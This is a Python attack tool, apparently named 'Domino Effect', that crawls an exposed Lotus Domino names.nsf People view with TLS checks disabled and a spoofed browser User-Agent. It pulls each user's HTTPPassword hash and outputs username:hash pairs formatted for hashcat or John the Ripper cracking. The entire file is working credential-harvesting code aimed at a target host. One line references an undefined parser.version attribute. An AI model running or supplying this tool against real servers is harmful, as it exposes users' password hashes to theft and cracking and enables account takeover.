# Domino Effect - A script to extract password hashes from insecure Lotus Domino names.nsf databases.
# Author: Jonathan Broche

import requests
from bs4 import BeautifulSoup
import argparse

requests.packages.urllib3.disable_warnings()


def extract_hashes(system, uri):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/534.3"
    }
    hashes = {}

    try:
        response = requests.get(
            f"https://{system}{uri}/People?OpenView",
            verify=False,
            headers=headers,
            timeout=3,
        )
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return hashes

    soup = BeautifulSoup(response.text, "html.parser")
    profile_links = soup.select('a[href*="OpenDocument"]')

    for link in profile_links:
        try:
            response = requests.get(
                f"https://{system}{link['href']}",
                verify=False,
                headers=headers,
                timeout=2,
            )
            response.raise_for_status()
        except requests.exceptions.RequestException:
            continue

        soup = BeautifulSoup(response.text, "html.parser")
        name = soup.select_one('input[name="$dspShortName"]').get("value", "").strip()
        httppassword = (
            soup.select_one('input[name="HTTPPassword"]').get("value", "").strip()
        )
        dsphttppassword = (
            soup.select_one('input[name="dspHTTPPassword"]').get("value", "").strip()
        )

        if httppassword and httppassword not in hashes:
            hashes[httppassword] = name
        elif dsphttppassword and dsphttppassword not in hashes:
            hashes[dsphttppassword] = name

    return hashes


def print_hashes(hashes, format):
    if format == "hashcat":
        print("\n".join(hashes))
    elif format == "john":
        print("\n".join([f"{n}:{h}" for h, n in hashes.items()]))
    else:
        for h, n in hashes.items():
            print(f"[*] User: {n} Hash: {h}")


def save_hashes(hashes, file_path):
    with open(file_path, "w") as file:
        file.writelines([f"{n}:{h}\n" for h, n in hashes.items()])
    print(f"Hashes saved to {file_path}")


def main():
    parser = argparse.ArgumentParser(
        description="Domino Effect - A Lotus Domino password hash tool by Jonathan Broche (@g0jhonny)"
    )
    parser.add_argument(
        "-v",
        "--version",
        action="version",
        version="%(prog)s 1.0",
        help="show program's version number and exit",
    )
    parser.add_argument("system", help="IP address or hostname to harvest hashes from.")
    parser.add_argument(
        "-u",
        "--uri",
        metavar="path",
        default="/names.nsf",
        help="Path to the names.nsf file. [Default: /names.nsf]",
    )
    parser.add_argument(
        "--hashcat", action="store_true", help="Print results for use with hashcat."
    )
    parser.add_argument(
        "--john",
        action="store_true",
        help="Print results for use with John the Ripper.",
    )
    parser.add_argument("-s", "--save", metavar="file", help="Save hashes to a file.")

    args = parser.parse_args()
    print(f"\nDomino Effect {parser.version}\n")

    hashes = extract_hashes(args.system, args.uri)
    print_hashes(
        hashes, "hashcat" if args.hashcat else ("john" if args.john else "default")
    )

    if args.save:
        save_hashes(hashes, args.save)

    print(f"\n{len(hashes)} hashes obtained\n")


if __name__ == "__main__":
    main()
